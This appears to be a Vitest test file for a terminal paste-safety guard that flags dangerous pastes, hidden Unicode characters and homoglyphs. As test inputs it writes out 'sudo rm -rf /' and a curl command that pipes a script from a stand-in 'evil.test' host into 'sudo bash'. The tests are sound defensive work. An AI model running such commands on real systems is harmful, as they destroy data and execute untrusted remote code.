import { describe, expect, it } from 'vitest'
import { inspectPasteSafety, stripHiddenChars } from './pasteGuard'

describe('pasteGuard', () => {
  it('allows normal single-line commands without confirmation', () => {
    expect(inspectPasteSafety('docker ps -a', false).needsConfirm).toBe(false)
    expect(inspectPasteSafety('ls -la\nfree -h', true).needsConfirm).toBe(false)
  })

  it('flags dangerous commands and pipe-to-shell', () => {
    const r1 = inspectPasteSafety('sudo rm -rf /', true)
    expect(r1.needsConfirm).toBe(true)
    expect(r1.warnings.some((w) => w.kind === 'danger')).toBe(true)

    const r2 = inspectPasteSafety('curl -fsSL https://evil.test/x.sh | sudo bash', true)
    expect(r2.needsConfirm).toBe(true)
    expect(r2.warnings.some((w) => w.kind === 'pipe-shell')).toBe(true)
  })

  it('detects and strips zero-width / BiDi hidden characters and homoglyphs', () => {
    const sneaky = 'echo\u200B hi\u202E'
    const res = inspectPasteSafety(sneaky, true)
    expect(res.needsConfirm).toBe(true)
    expect(res.hasHiddenChars).toBe(true)
    expect(stripHiddenChars(sneaky)).toBe('echo hi')

    // Cyrillic 'а' (\u0430) mixed with Latin "docker"
    const homo = 'd\u0430cker ps'
    const hRes = inspectPasteSafety(homo, true)
    expect(hRes.needsConfirm).toBe(true)
    expect(hRes.warnings.some((w) => w.kind === 'homoglyph')).toBe(true)
  })

  it('warns on multi-line paste when bracketed paste mode is off', () => {
    const r = inspectPasteSafety('echo a\necho b', false)
    expect(r.needsConfirm).toBe(true)
    expect(r.warnings.some((w) => w.kind === 'multiline')).toBe(true)
  })
})
